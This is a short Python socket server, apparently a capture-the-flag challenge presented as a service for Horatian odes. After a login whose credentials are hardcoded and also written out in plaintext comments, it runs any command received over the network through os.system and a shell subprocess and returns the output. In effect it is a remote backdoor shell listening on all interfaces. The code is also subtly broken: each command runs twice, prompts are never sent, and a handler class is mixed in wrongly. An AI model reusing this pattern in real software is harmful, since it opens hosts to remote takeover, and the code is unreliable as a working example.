#!/usr/bin/env python3

from Crypto.Util.number import bytes_to_long, long_to_bytes
import os
import sys
import textwrap
import socketserver
import string
import readline
import threading
from time import *
import subprocess

username = long_to_bytes(5219516256036151662) #Horatian
password = long_to_bytes(16800368551252343233468966555125391909683) #1_1Iv3_f0r_H0rAc3
iusername = ""
ipassword = ""




class Service(socketserver.BaseRequestHandler):

	def get_creds(self):
		self.send(b"Only the best Odes are welcome here, which do you prefer ?")
		iusername = self.receive(b"Username: ").strip()
		ipassword = self.receive(b"Password : ").strip()

		if (username == iusername) and (password == ipassword):
			return True
		else :
			return False


	def handle(self):
		loggedin = self.get_creds()
		if not loggedin:
			self.send(b"Never heard of this Ode")
			return

		self.send(b"Welcome ! You can get some real good Horatian odes here !")
		while 1:
			cmd = self.receive(b"Command : ")
			os.system(cmd)
			p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			self.send(p.stdout.read())


	def send(self,string, newline= True):
		if newline:
			string = string + b"\n"
			self.request.sendall(string)
	def receive(self, prompt= b"> "):
		self.send(prompt, newline=False)
		return self.request.recv(4096).strip()


class ThreadedService(
	socketserver.ThreadingMixIn,
	socketserver.TCPServer,
	socketserver.DatagramRequestHandler,
):
	pass

def main():
	print("Starting server ... ")
	port = 7321
	host = "0.0.0.0"

	service = Service
	server = ThreadedService((host,port), service)
	server.allow_reuse_address = True

	server_thread = threading.Thread(target = server.serve_forever)

	server_thread.daemon = True
	server_thread.start()

	print("Server started on " + str(server.server_address) + " !")

	while True:
		sleep(10)


if __name__ == "__main__":
	main()			 





	